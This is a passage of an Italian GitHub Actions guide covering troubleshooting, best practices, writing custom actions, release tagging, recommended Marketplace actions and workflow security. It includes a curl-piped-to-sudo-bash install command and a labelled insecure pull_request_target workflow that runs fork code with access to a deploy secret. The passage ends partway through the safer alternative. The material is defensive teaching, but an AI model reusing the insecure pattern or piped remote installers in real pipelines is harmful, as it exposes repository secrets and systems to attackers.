      - 'docs/**'
      - '.vscode/**'
      - 'LICENSE'
```

**4. Timeout appropriati:**
Impostare sempre un timeout ragionevole per evitare job bloccati che consumano minuti:
```yaml
jobs:
  test:
    timeout-minutes: 15  # Invece del default 360 minuti
```

**5. Ottimizzazione della matrice:**
Limitare le combinazioni della matrice allo stretto necessario. Non testare su 3 OS x 5 versioni se la maggior parte degli utenti usa una sola combinazione.

**6. Esecuzione condizionale:**
Usare `if` per saltare job non necessari:
```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
```

**7. Job leggeri su Linux:**
Spostare su Linux tutti i job che non richiedono specificamente Windows o macOS (linting, analisi statica, build Docker).

---

## Troubleshooting

### "Il workflow non si triggera"

**Causa comune:** Il file YAML non e' nella posizione corretta o ha errori di sintassi.

**Soluzioni:**
- Verificare che il file sia in `.github/workflows/` (non `.github/workflow/` senza la 's').
- Verificare che il file abbia estensione `.yml` o `.yaml`.
- Controllare i filtri branch: se il workflow e' su `main` ma si fa push su `develop`, non partira'.
- Verificare la sintassi YAML con un validatore online.
- Per `workflow_dispatch`: il workflow deve esistere sul branch **default** (main/master) per apparire nella UI.
- I workflow nei fork non si attivano di default.

### "Permission denied GITHUB_TOKEN"

**Causa:** Il token non ha i permessi necessari per l'operazione richiesta.

**Soluzione:** Aggiungere il blocco `permissions` esplicito:
```yaml
permissions:
  contents: write      # Per push/tag
  pull-requests: write # Per commenti su PR
  packages: write      # Per push container
  issues: write        # Per gestire issue
```
Verificare anche Settings > Actions > General > Workflow permissions.

### "Cache miss"

**Causa:** La chiave della cache non corrisponde a nessuna cache esistente.

**Soluzioni:**
- Verificare che `hashFiles()` punti al file corretto: `hashFiles('**/package-lock.json')` usa il pattern glob, il percorso deve essere relativo alla root del repository.
- Controllare che il file usato per l'hash (es. `package-lock.json`) sia committato nel repository.
- Le cache sono isolate per branch: un branch non puo' accedere alla cache di un altro branch (tranne il branch default).
- La cache ha un limite di 10 GB per repository; le cache piu' vecchie vengono eliminate automaticamente.
- Utilizzare `restore-keys` per cache parziali come fallback.

### "Self-hosted runner offline"

**Soluzioni:**
- Verificare lo stato del servizio: `sudo ./svc.sh status`.
- Controllare i log: `journalctl -u actions.runner.<nome>`.
- Verificare la connettivita' di rete verso `github.com` e `*.actions.githubusercontent.com`.
- Verificare che i label del runner corrispondano a quelli richiesti dal workflow `runs-on`.
- Se il runner e' ephemeral, verificare che l'orchestratore lo stia ricreando dopo ogni job.

### "Secret non disponibile in fork PR"

**Questo e' un comportamento voluto per sicurezza.** Le pull request dai fork non hanno accesso ai secrets del repository per impedire a utenti esterni di esfiltrare credenziali attraverso PR malevole.

**Soluzioni alternative:**
- Utilizzare `pull_request_target` (con estrema cautela) che esegue il workflow nel contesto del repository base.
- Dividere il workflow in una parte che non richiede secrets (eseguita sulla PR) e una parte con secrets (triggerata da `workflow_run` dopo il merge).
- Per la CI di base, non dovrebbero servire secrets.

### Debug Avanzato

Per abilitare il logging dettagliato, impostare queste variabili come **secrets** del repository:

| Secret                   | Valore | Effetto                                        |
|--------------------------|--------|------------------------------------------------|
| `ACTIONS_STEP_DEBUG`     | `true` | Log dettagliati per ogni step                   |
| `ACTIONS_RUNNER_DEBUG`   | `true` | Log diagnostici del runner                       |

In alternativa, e' possibile ri-eseguire un workflow fallito con debug abilitato dalla UI: "Re-run jobs" > "Enable debug logging".

Per debug locale dei workflow, utilizzare lo strumento **act** (https://github.com/nektos/act) che permette di eseguire GitHub Actions in locale con Docker:

```bash
# Installazione
brew install act  # macOS
# oppure
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash

# Esecuzione locale
act push                          # Simula un evento push
act -j test                       # Esegui solo il job "test"
act -s MY_SECRET=value            # Passa secrets
act --env-file .env               # Carica variabili da file
```

---

## Best Practices

1. **Principio del minimo privilegio per i permessi.** Definire sempre il blocco `permissions` esplicito nel workflow, concedendo solo i permessi strettamente necessari. Non lasciare i permessi al default (`write-all` sui repository personali). Questo limita l'impatto in caso di compromissione di una action di terze parti.

2. **Pinnare le actions a un SHA specifico per sicurezza.** Anziche usare tag mobili come `@v4`, utilizzare lo SHA completo del commit per le actions critiche: `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`. Questo previene attacchi di supply chain in cui un maintainer malevolo modifica il codice dietro un tag esistente. Come compromesso, usare almeno il tag major (`@v4`) e mai `@main` o `@latest`.

3. **Utilizzare concurrency con cancel-in-progress sulle pull request.** Ogni push su una PR dovrebbe annullare le esecuzioni precedenti della stessa PR. Questo riduce lo spreco di minuti e garantisce che il feedback sia sempre relativo all'ultimo codice pushato.

4. **Separare i workflow per responsabilita'.** Creare workflow distinti per CI, CD, security scanning e task schedulati. Non inserire tutto in un unico file monolitico. Workflow separati sono piu' facili da mantenere, debuggare e riutilizzare.

5. **Non memorizzare mai secrets nei file del repository.** Utilizzare esclusivamente GitHub Secrets (Settings > Secrets) per qualsiasi credenziale. Per l'accesso ai cloud provider (AWS, Azure, GCP), preferire sempre OIDC rispetto a credenziali statiche. Le credenziali statiche possono essere esposte in caso di leak del repository, mentre OIDC genera token temporanei con scope limitato.

6. **Implementare cache aggressiva con chiavi deterministiche.** Utilizzare `hashFiles()` per generare chiavi di cache basate sui lock file delle dipendenze. Configurare sempre `restore-keys` come fallback per cache parziali. Una buona strategia di caching riduce i tempi di CI del 50-80% e consente risparmi significativi sui minuti.

7. **Testare i workflow localmente con act prima del push.** Lo strumento `act` permette di eseguire i workflow in locale, risparmiando tempo e minuti. E' particolarmente utile per debuggare problemi di sintassi YAML, espressioni condizionali e variabili d'ambiente.

8. **Utilizzare reusable workflows per la standardizzazione organizzativa.** Creare un repository centrale di workflow riusabili a livello organization. Questo garantisce che tutti i team seguano le stesse pratiche di CI/CD, semplifica la manutenzione e riduce la duplicazione di codice tra repository.

9. **Configurare timeout realistici su ogni job.** Il timeout default di 360 minuti e' eccessivo per la maggior parte dei job. Impostare timeout di 10-30 minuti per CI standard e 60 minuti per build complesse. Questo previene il consumo involontario di minuti in caso di job bloccati o loop infiniti.

10. **Monitorare e ottimizzare regolarmente i tempi di esecuzione.** Utilizzare la tab Actions di GitHub per analizzare i tempi medi di esecuzione. Identificare i colli di bottiglia (step lenti, cache miss frequenti, matrice troppo ampia) e ottimizzare progressivamente. Un workflow CI efficiente dovrebbe completarsi in meno di 10 minuti per la maggior parte dei progetti.

---

> **Riferimenti ufficiali:**
> - Documentazione GitHub Actions: https://docs.github.com/en/actions
> - Marketplace Actions: https://github.com/marketplace?type=actions
> - Starter Workflows: https://github.com/actions/starter-workflows
> - Actions Runner Controller: https://github.com/actions/actions-runner-controller
> - Strumento act per test locali: https://github.com/nektos/act

---

## Creare Azioni Personalizzate

Oltre a utilizzare le migliaia di actions disponibili nel Marketplace, e' possibile creare azioni personalizzate per automatizzare logica specifica del proprio progetto o della propria organizzazione. GitHub supporta tre tipi di azioni personalizzate: **JavaScript**, **Docker container** e **composite**. Ciascun tipo ha vantaggi e limitazioni specifiche che ne determinano l'idoneita' per diversi casi d'uso.

Le azioni personalizzate richiedono un file di metadati chiamato `action.yml` (o `action.yaml`) che definisce gli input, gli output e la configurazione di esecuzione. Questo file e' obbligatorio per tutti i tipi di azioni e segue una struttura YAML standardizzata.

### JavaScript Actions

Le JavaScript actions sono il tipo di azione piu' diffuso e performante. Vengono eseguite direttamente sulla macchina del runner senza la necessita' di un container Docker, il che le rende significativamente piu' veloci all'avvio rispetto alle Docker actions. Sono compatibili con tutti i runner hosted da GitHub (Ubuntu, Windows, macOS) senza modifiche.

GitHub fornisce il **Actions Toolkit**, una collezione di pacchetti Node.js progettati specificamente per lo sviluppo di azioni:

- **`@actions/core`**: Interfaccia per i comandi del workflow, variabili di input/output, stati di uscita e messaggi di debug.
- **`@actions/github`**: Client Octokit REST autenticato e accesso ai contesti di GitHub Actions.
- **`@actions/exec`**: Esecuzione di comandi shell con gestione di stdout/stderr.
- **`@actions/io`**: Operazioni su file e directory (cp, mv, mkdir, which).
- **`@actions/tool-cache`**: Download e cache di strumenti binari.
- **`@actions/artifact`**: Upload e download di artifacts.
- **`@actions/cache`**: Gestione della cache delle dipendenze.

**Struttura di un progetto JavaScript action:**

```
mia-azione-js/
├── action.yml          # Metadati dell'azione
├── index.js            # Entry point
├── package.json        # Dipendenze Node.js
├── package-lock.json   # Lock file
├── dist/               # Codice compilato (se si usa bundler)
│   └── index.js
├── __tests__/          # Test unitari
│   └── index.test.js
└── README.md           # Documentazione
```

**Esempio completo — Azione che verifica la copertura del codice:**

File `action.yml`:

```yaml
name: 'Coverage Checker'
description: 'Verifica che la copertura dei test superi una soglia minima'
author: 'DevOps Team'

inputs:
  coverage-file:
    description: 'Percorso al file di report della copertura (formato JSON)'
    required: true
  threshold:
    description: 'Soglia minima di copertura in percentuale'
    required: false
    default: '80'
  fail-on-threshold:
    description: 'Se true, fallisce il workflow quando la soglia non e'' raggiunta'
    required: false
    default: 'true'

outputs:
  coverage-percentage:
    description: 'Percentuale di copertura rilevata'
  above-threshold:
    description: 'true se la copertura supera la soglia, false altrimenti'

runs:
  using: 'node20'
  main: 'dist/index.js'

branding:
  icon: 'check-circle'
  color: 'green'
```

File `index.js`:

```javascript
const core = require('@actions/core');
const github = require('@actions/github');
const fs = require('fs');
const path = require('path');

async function run() {
  try {
    // Leggi gli input
    const coverageFile = core.getInput('coverage-file', { required: true });
    const threshold = parseFloat(core.getInput('threshold'));
    const failOnThreshold = core.getInput('fail-on-threshold') === 'true';

    // Verifica che il file esista
    const resolvedPath = path.resolve(coverageFile);
    if (!fs.existsSync(resolvedPath)) {
      core.setFailed(`File di copertura non trovato: ${resolvedPath}`);
      return;
    }

    // Leggi e analizza il report
    const reportContent = fs.readFileSync(resolvedPath, 'utf8');
    const report = JSON.parse(reportContent);

    // Calcola la copertura complessiva
    const totalStatements = report.total.statements.total;
    const coveredStatements = report.total.statements.covered;
    const coveragePercentage = totalStatements > 0
      ? ((coveredStatements / totalStatements) * 100).toFixed(2)
      : 0;

    const aboveThreshold = parseFloat(coveragePercentage) >= threshold;

    // Imposta gli output
    core.setOutput('coverage-percentage', coveragePercentage);
    core.setOutput('above-threshold', aboveThreshold.toString());

    // Log dei risultati
    core.info(`Copertura: ${coveragePercentage}%`);
    core.info(`Soglia: ${threshold}%`);
    core.info(`Sopra soglia: ${aboveThreshold}`);

    // Crea un sommario nella pagina del workflow
    core.summary
      .addHeading('Report Copertura', 2)
      .addTable([
        [
          { data: 'Metrica', header: true },
          { data: 'Valore', header: true }
        ],
        ['Copertura', `${coveragePercentage}%`],
        ['Soglia', `${threshold}%`],
        ['Risultato', aboveThreshold ? 'PASS' : 'FAIL']
      ])
      .write();

    // Gestisci il fallimento
    if (!aboveThreshold && failOnThreshold) {
      core.setFailed(
        `Copertura ${coveragePercentage}% sotto la soglia minima di ${threshold}%`
      );
    }

    // Commenta sulla PR se disponibile
    if (github.context.payload.pull_request) {
      const token = core.getInput('github-token') || process.env.GITHUB_TOKEN;
      if (token) {
        const octokit = github.getOctokit(token);
        const emoji = aboveThreshold ? '✅' : '❌';
        await octokit.rest.issues.createComment({
          owner: github.context.repo.owner,
          repo: github.context.repo.repo,
          issue_number: github.context.payload.pull_request.number,
          body: `${emoji} **Coverage Report**\n\nCopertura: **${coveragePercentage}%** (soglia: ${threshold}%)`
        });
      }
    }
  } catch (error) {
    core.setFailed(`Errore durante l'esecuzione: ${error.message}`);
  }
}

run();
```

**Bundling delle dipendenze con ncc:**

Per distribuire una JavaScript action senza includere l'intera directory `node_modules`, si utilizza `@vercel/ncc` per compilare tutto in un singolo file:

```bash
# Installazione
npm install --save-dev @vercel/ncc

# Compilazione
npx ncc build index.js --out dist --source-map --license licenses.txt

# Il risultato e' un singolo file dist/index.js che include tutte le dipendenze
```

Nel campo `main` di `action.yml` si punta al file compilato: `main: 'dist/index.js'`. Questo approccio e' preferito rispetto al commit di `node_modules/` perche' riduce la dimensione del repository, elimina problemi di compatibilita' cross-platform e velocizza il checkout dell'azione.

### Docker Container Actions

Le Docker container actions eseguono il codice all'interno di un container Docker, garantendo un ambiente completamente controllato e riproducibile. Sono ideali quando l'azione richiede dipendenze di sistema specifiche, strumenti non disponibili nei runner standard, o quando si preferisce utilizzare un linguaggio diverso da JavaScript (Python, Go, Rust, Bash, ecc.).

**Limitazioni delle Docker actions:**

- Funzionano **solo su runner Linux** (non su Windows o macOS).
- Sono **piu' lente** all'avvio rispetto alle JavaScript actions a causa del tempo di build/pull dell'immagine.
- Devono essere eseguite con l'utente root (non utilizzare l'istruzione `USER` nel Dockerfile).
- Non e' possibile utilizzare `WORKDIR` nel Dockerfile; GitHub imposta la propria directory di lavoro.

**Esempio completo — Azione Docker per analisi di qualita' del codice:**

File `action.yml`:

```yaml
name: 'Code Quality Analyzer'
description: 'Analizza la qualita del codice Python utilizzando strumenti personalizzati'
author: 'DevOps Team'

inputs:
  source-directory:
    description: 'Directory contenente il codice sorgente'
    required: false
    default: 'src'
  max-complexity:
    description: 'Complessita ciclomatica massima consentita'
    required: false
    default: '10'
  output-format:
    description: 'Formato di output (text, json, sarif)'
    required: false
    default: 'text'

outputs:
  total-issues:
    description: 'Numero totale di problemi trovati'
  complexity-score:
    description: 'Score medio di complessita'

runs:
  using: 'docker'
  image: 'Dockerfile'
  args:
    - ${{ inputs.source-directory }}
    - ${{ inputs.max-complexity }}
    - ${{ inputs.output-format }}
  env:
    PYTHONUNBUFFERED: '1'

branding:
  icon: 'search'
  color: 'purple'
```

File `Dockerfile`:

```dockerfile
FROM python:3.12-alpine

# Installa dipendenze di sistema
RUN apk add --no-cache git jq

# Installa strumenti Python per analisi del codice
RUN pip install --no-cache-dir \
    radon==6.0.1 \
    flake8==7.1.1 \
    pylint==3.3.3 \
    bandit==1.8.3

# Copia lo script di entrypoint
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
```

File `entrypoint.sh`:

```bash
#!/bin/sh
set -e

SOURCE_DIR="${1:-src}"
MAX_COMPLEXITY="${2:-10}"
OUTPUT_FORMAT="${3:-text}"

echo "=== Analisi Qualita' Codice ==="
echo "Directory: ${SOURCE_DIR}"
echo "Complessita' massima: ${MAX_COMPLEXITY}"
echo "Formato output: ${OUTPUT_FORMAT}"
echo ""

# Verifica complessita' ciclomatica con radon
echo "--- Analisi Complessita' ---"
COMPLEXITY_OUTPUT=$(radon cc "${SOURCE_DIR}" -a -s 2>/dev/null || true)
echo "${COMPLEXITY_OUTPUT}"

# Calcola score medio
AVG_SCORE=$(echo "${COMPLEXITY_OUTPUT}" | grep "Average complexity" | awk '{print $NF}' || echo "0")

# Conteggio problemi con flake8
echo ""
echo "--- Analisi Stile ---"
ISSUES=$(flake8 "${SOURCE_DIR}" --count --statistics 2>/dev/null || true)
TOTAL_ISSUES=$(echo "${ISSUES}" | tail -1 | awk '{print $1}' || echo "0")

echo "Problemi trovati: ${TOTAL_ISSUES}"
echo "Complessita' media: ${AVG_SCORE}"

# Imposta gli output dell'azione
echo "total-issues=${TOTAL_ISSUES}" >> "${GITHUB_OUTPUT}"
echo "complexity-score=${AVG_SCORE}" >> "${GITHUB_OUTPUT}"

# Fallisci se la complessita' supera il massimo
if [ "$(echo "${AVG_SCORE} > ${MAX_COMPLEXITY}" | bc -l 2>/dev/null)" = "1" ]; then
  echo "ERRORE: Complessita' media (${AVG_SCORE}) supera il massimo consentito (${MAX_COMPLEXITY})"
  exit 1
fi

echo "Analisi completata con successo."
```

**Utilizzo di immagini pre-built per velocizzare l'esecuzione:**

Anziche' costruire l'immagine Docker ad ogni esecuzione, e' possibile puntare a un'immagine gia' pubblicata su un registry:

```yaml
runs:
  using: 'docker'
  image: 'docker://ghcr.io/mia-org/code-analyzer:v2.1.0'
  args:
    - ${{ inputs.source-directory }}
```

Questa tecnica elimina il tempo di build del Dockerfile e riduce l'esecuzione a pochi secondi per il pull dell'immagine (che viene anche cachata dal runner).

### Confronto tra i Tipi di Azioni

La scelta del tipo di azione dipende da diversi fattori. Ecco una guida decisionale:

**Scegliere JavaScript quando:**
- L'azione deve funzionare su tutti gli OS (Linux, Windows, macOS).
- La velocita' di avvio e' critica.
- L'azione interagisce prevalentemente con l'API GitHub.
- Si lavora gia' nell'ecosistema Node.js.

**Scegliere Docker quando:**
- Servono dipendenze di sistema specifiche (compilatori, librerie native, strumenti CLI).
- Si preferisce un linguaggio diverso da JavaScript (Python, Go, Rust, ecc.).
- L'ambiente deve essere completamente isolato e riproducibile.
- L'azione funziona solo su Linux (non servono Windows/macOS).

**Scegliere Composite quando:**
- Si vogliono raggruppare step esistenti in un'unita' riutilizzabile.
- Non serve logica complessa (basta orchestrare comandi shell e actions esistenti).
- Si vuole creare rapidamente un'azione senza setup di build (no Node.js, no Docker).
- Si lavora esclusivamente nel contesto di un singolo repository o organizzazione.

---

## Versionamento e Pubblicazione delle Actions

### Schema di Versionamento

GitHub raccomanda l'adozione del **Semantic Versioning** (SemVer) per le azioni personalizzate. Il formato e' `MAJOR.MINOR.PATCH` (es. `v2.1.5`), dove:

- **MAJOR**: Cambiamenti incompatibili (breaking changes) che richiedono modifiche nei workflow dei consumatori.
- **MINOR**: Nuove funzionalita' retrocompatibili.
- **PATCH**: Bug fix e correzioni minori retrocompatibili.

La convenzione di GitHub prevede di mantenere tre livelli di tag per ogni release:

```
v2.1.5   # Tag specifico della release (immutabile)
v2.1     # Tag minor che punta all'ultima patch della 2.1.x
v2       # Tag major che punta all'ultima release della 2.x.x
```

Questo permette ai consumatori di scegliere il livello di aggiornamento automatico desiderato:

```yaml
# Pin esatto (massima stabilita', nessun aggiornamento automatico)
uses: mia-org/mia-azione@v2.1.5

# Pin minor (riceve patch automatiche)
uses: mia-org/mia-azione@v2.1

# Pin major (riceve minor e patch automatiche)
uses: mia-org/mia-azione@v2

# Pin a SHA (massima sicurezza, immutabile)
uses: mia-org/mia-azione@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
```

### Gestione dei Tag con Script di Release

Per mantenere i tag major e minor allineati alla release piu' recente, si utilizza uno script o un workflow automatico:

```bash
#!/bin/bash
# release-tag.sh — Script per gestire tag SemVer
# Utilizzo: ./release-tag.sh v2.1.5

TAG="$1"

if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Errore: il tag deve seguire il formato vMAJOR.MINOR.PATCH"
  exit 1
fi

# Estrai major e minor
MAJOR=$(echo "$TAG" | sed 's/v\([0-9]*\).*/v\1/')
MINOR=$(echo "$TAG" | sed 's/v\([0-9]*\.[0-9]*\).*/v\1/')

echo "Creazione tag: $TAG"
git tag -fa "$TAG" -m "Release $TAG"

echo "Aggiornamento tag major: $MAJOR"
git tag -fa "$MAJOR" -m "Update $MAJOR tag to $TAG"

echo "Aggiornamento tag minor: $MINOR"
git tag -fa "$MINOR" -m "Update $MINOR tag to $TAG"

echo "Push tags..."
git push origin "$TAG" "$MAJOR" "$MINOR" --force
```

### Workflow Automatico di Release

```yaml
# .github/workflows/release-action.yml
# Automatizza il processo di release per una JavaScript action
name: Release Action

on:
  push:
    tags:
      - 'v*.*.*'

permissions:
  contents: write

jobs:
  release:
    name: Pubblica Release
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Installa dipendenze e compila
        run: |
          npm ci
          npm run build  # Assumendo che esegua ncc build

      - name: Verifica che dist/ sia aggiornato
        run: |
          if [ -n "$(git diff --name-only dist/)" ]; then
            echo "ERRORE: dist/ non e' aggiornato. Esegui npm run build e committa."
            exit 1
          fi

      - name: Estrai tag corrente
        id: tag
        run: echo "version=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT

      - name: Aggiorna tag major e minor
        run: |
          TAG="${{ steps.tag.outputs.version }}"
          MAJOR=$(echo "$TAG" | sed 's/v\([0-9]*\).*/v\1/')
          MINOR=$(echo "$TAG" | sed 's/v\([0-9]*\.[0-9]*\).*/v\1/')

          git tag -fa "$MAJOR" -m "Update $MAJOR tag to $TAG"
          git tag -fa "$MINOR" -m "Update $MINOR tag to $TAG"
          git push origin "$MAJOR" "$MINOR" --force

      - name: Crea GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          generate_release_notes: true
          body: |
            ## Utilizzo

            ```yaml
            - uses: ${{ github.repository }}@${{ steps.tag.outputs.version }}
            ```
```

### Pubblicazione sul Marketplace

Per pubblicare un'azione sul GitHub Marketplace, il repository deve soddisfare questi requisiti:

1. L'azione deve risiedere in un **repository pubblico**.
2. Ogni repository puo' contenere **una sola azione** (un solo `action.yml` alla root).
3. Il file `action.yml` deve includere `name`, `description` e `branding` (icona e colore).
4. Il campo `name` deve essere **univoco** nel Marketplace; non puo' coincidere con un'azione esistente.

Il processo di pubblicazione avviene tramite la UI di GitHub: al momento della creazione di un release, apparira' l'opzione "Publish this Action to the GitHub Marketplace" con un checklist dei requisiti.

**Sezione branding obbligatoria per il Marketplace:**

```yaml
branding:
  # Icona da Feather Icons (https://feathericons.com)
  icon: 'shield'
  # Colore di sfondo: white, yellow, blue, green, orange, red, purple, gray-dark
  color: 'blue'
```

---

## Actions Marketplace — Guida e Raccomandazioni

Il GitHub Actions Marketplace e' il catalogo ufficiale che raccoglie oltre 25.000 azioni create dalla community e da vendor verificati. Non tutte le azioni sono ugualmente affidabili: la scelta di un'azione dal Marketplace richiede una valutazione consapevole di sicurezza, manutenzione e qualita'.

### Criteri di Valutazione

Prima di adottare un'azione dal Marketplace, verificare questi criteri:

1. **Badge "Verified creator"**: Le azioni con questo badge provengono da organizzazioni verificate da GitHub (es. `actions/`, `docker/`, `aws-actions/`, `azure/`, `google-github-actions/`).
2. **Numero di stelle e utilizzo**: Un numero elevato di stelle e una vasta adozione indicano affidabilita' e maturita'.
3. **Frequenza di aggiornamento**: Azioni non aggiornate da oltre 12 mesi potrebbero avere vulnerabilita' non corrette.
4. **Codice sorgente leggibile**: Ispezionare sempre il codice dell'azione, specialmente `action.yml` e l'entry point, per verificare che non contenga codice malevolo.
5. **Licenza**: Verificare che la licenza sia compatibile con il proprio progetto (MIT, Apache 2.0, ecc.).
6. **Issue e PR aperte**: Un alto numero di issue aperte senza risposte indica potenziale abbandono.

### Actions Fondamentali (First-Party di GitHub)

Le seguenti azioni sono mantenute direttamente da GitHub e utilizzate nella quasi totalita' dei workflow professionali:

| Azione | Versione | Utilizzo |
|--------|----------|----------|
| `actions/checkout` | `@v4` | Checkout del codice sorgente dal repository |
| `actions/setup-node` | `@v4` | Configurazione ambiente Node.js con cache |
| `actions/setup-python` | `@v5` | Configurazione ambiente Python con cache |
| `actions/setup-java` | `@v4` | Configurazione JDK (Temurin, Corretto, Oracle) |
| `actions/setup-go` | `@v5` | Configurazione ambiente Go con cache |
| `actions/setup-dotnet` | `@v4` | Configurazione .NET SDK |
| `actions/cache` | `@v4` | Cache generico per dipendenze |
| `actions/upload-artifact` | `@v4` | Upload di file tra job |
| `actions/download-artifact` | `@v4` | Download di artifacts |
| `actions/github-script` | `@v7` | Scripting con API GitHub via Octokit |
| `actions/stale` | `@v9` | Gestione automatica issue e PR inattive |
| `actions/dependency-review-action` | `@v4` | Revisione sicurezza dipendenze nelle PR |

### Actions Community Raccomandate per Categoria

**Build e Container:**

| Azione | Utilizzo |
|--------|----------|
| `docker/build-push-action@v6` | Build e push immagini Docker multi-piattaforma |
| `docker/setup-buildx-action@v3` | Setup Docker Buildx per build avanzati |
| `docker/login-action@v3` | Autenticazione ai container registry |
| `docker/metadata-action@v5` | Generazione automatica tag e label Docker |
| `docker/setup-qemu-action@v3` | Emulazione multi-architettura (ARM, etc.) |

**Sicurezza e Analisi:**

| Azione | Utilizzo |
|--------|----------|
| `github/codeql-action@v3` | Analisi statica del codice con CodeQL |
| `aquasecurity/trivy-action@master` | Scansione vulnerabilita' container e codice |
| `gitleaks/gitleaks-action@v2` | Rilevamento secrets nel codice sorgente |
| `ossf/scorecard-action@v2` | Valutazione sicurezza supply chain (OpenSSF) |
| `step-security/harden-runner@v2` | Hardening del runner con monitoraggio di rete |

**Cloud e Deployment:**

| Azione | Utilizzo |
|--------|----------|
| `aws-actions/configure-aws-credentials@v4` | Autenticazione AWS (OIDC e chiavi) |
| `azure/login@v2` | Autenticazione Azure via OIDC |
| `google-github-actions/auth@v2` | Autenticazione GCP via Workload Identity |
| `cloudflare/wrangler-action@v3` | Deploy su Cloudflare Workers e Pages |
| `amondnet/vercel-action@v25` | Deploy su Vercel |

**Notifiche e Comunicazione:**

| Azione | Utilizzo |
|--------|----------|
| `slackapi/slack-github-action@v2.0.0` | Notifiche Slack (webhook e API) |
| `peter-evans/create-pull-request@v7` | Creazione automatica di pull request |
| `peter-evans/create-or-update-comment@v4` | Commenti automatici su issue e PR |
| `marocchino/sticky-pull-request-comment@v2` | Commento aggiornabile (sticky) sulle PR |

**Gestione Release:**

| Azione | Utilizzo |
|--------|----------|
| `softprops/action-gh-release@v2` | Creazione GitHub Release con asset |
| `mathieudutour/github-tag-action@v6.2` | Tagging automatico con SemVer |
| `mikepenz/release-changelog-builder-action@v5` | Generazione changelog automatico |
| `google-github-actions/release-please-action@v4` | Automazione release con Conventional Commits |

**Linting e Qualita':**

| Azione | Utilizzo |
|--------|----------|
| `dorny/paths-filter@v3` | Filtro path per CI selettiva (monorepo) |
| `reviewdog/action-eslint@v1` | ESLint con annotazioni inline su PR |
| `hadolint/hadolint-action@v3.1.0` | Linting Dockerfile |
| `davelosert/vitest-coverage-report-action@v2` | Report copertura Vitest nelle PR |

---

## Sicurezza Avanzata dei Workflow

La sicurezza dei workflow GitHub Actions e' un aspetto critico spesso sottovalutato. Un workflow compromesso puo' esfiltrare secrets, iniettare codice malevolo negli artefatti di build, o compromettere l'infrastruttura di deployment. Le seguenti pratiche rappresentano lo stato dell'arte della sicurezza per le pipeline CI/CD su GitHub Actions nel 2025-2026.

### Supply Chain Security per le Actions

L'attacco piu' significativo del 2025 ha coinvolto l'azione `aquasecurity/trivy-action`: un attaccante ha reindirizzato 76 dei 77 tag di versione verso commit malevoli. Ogni workflow che referenziava quei tag ha automaticamente eseguito codice compromesso. Questo incidente dimostra l'importanza critica del pinning SHA.

**Pinning a SHA completo (obbligatorio per azioni critiche):**

```yaml
# INSICURO: tag mobile, puo' essere reindirizzato
- uses: actions/checkout@v4

# SICURO: SHA completo, immutabile
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.7
```

> **Raccomandazione:** Utilizzare strumenti come `pin-github-action` per automatizzare il pinning dei SHA e mantenere commenti con il tag leggibile per facilitare gli aggiornamenti. Per le azioni first-party di GitHub (`actions/*`), il rischio di compromissione e' basso, quindi il pin al tag major (`@v4`) e' un compromesso accettabile. Per tutte le azioni di terze parti, specialmente quelle meno note, il pin SHA e' fortemente raccomandato.

**Tool per verificare e aggiornare il pinning:**

```bash
# Installazione di pin-github-action
npm install -g pin-github-action

# Analizza un workflow e propone il pinning
pin-github-action .github/workflows/ci.yml

# Aggiornamento automatico con Dependabot
# .github/dependabot.yml
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Dependabot aggiorna automaticamente i SHA e i commenti
```

### Protezione dei Secrets

I secrets sono un bersaglio primario per gli attaccanti. Oltre alla crittografia automatica di GitHub, adottare le seguenti misure:

**1. Principio del minimo privilegio per GITHUB_TOKEN:**

```yaml
# A livello di workflow: permessi minimi globali
permissions:
  contents: read

jobs:
  deploy:
    # A livello di job: permessi aggiuntivi solo dove necessario
    permissions:
      contents: read
      id-token: write    # Solo per OIDC
      packages: write    # Solo per push container
```

**2. Impostare permessi restrittivi di default a livello repository:**

In Settings > Actions > General > Workflow permissions, selezionare "Read repository contents and packages permissions" anziche' "Read and write permissions". Questo impone il blocco `permissions` esplicito in ogni workflow, eliminando il rischio di permessi eccessivi per default.

**3. Prevenzione di esposizione dei secrets nei log:**

```yaml
steps:
  - name: Uso sicuro dei secrets
    run: |
      # MAI fare echo di un secret
      # echo "${{ secrets.API_KEY }}"  # PERICOLOSO

      # Passare secrets solo come variabili d'ambiente
      curl -H "Authorization: Bearer ${API_KEY}" https://api.example.com
    env:
      API_KEY: ${{ secrets.API_KEY }}
```

### Rischi dell'Evento pull_request_target

L'evento `pull_request_target` e' tra i vettori di attacco piu' pericolosi: esegue il workflow nel contesto del repository base (con accesso ai secrets), ma puo' essere triggerato da una PR proveniente da un fork con codice arbitrario.

**Pattern pericoloso (da evitare):**

```yaml
# PERICOLOSO: esegue codice dal fork con accesso ai secrets del repo
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}  # PERICOLOSO: codice dal fork
      - run: npm ci && npm test  # Questo esegue codice controllato dall'attaccante
        env:
          SECRET: ${{ secrets.DEPLOY_KEY }}  # L'attaccante puo' esfiltrare il secret
```

**Pattern sicuro — Separazione dei job:**

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  # Job 1: esegue nel contesto del fork SENZA secrets
  build-untrusted:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
      - run: npm ci && npm test
      # Nessun accesso a secrets qui

      - uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: coverage/

  # Job 2: esegue nel contesto del repo base CON secrets
  # Solo DOPO approvazione manuale (environment con required reviewers)
  comment-results:
    needs: build-untrusted
    runs-on: ubuntu-latest
    environment: pr-review  # Richiede approvazione
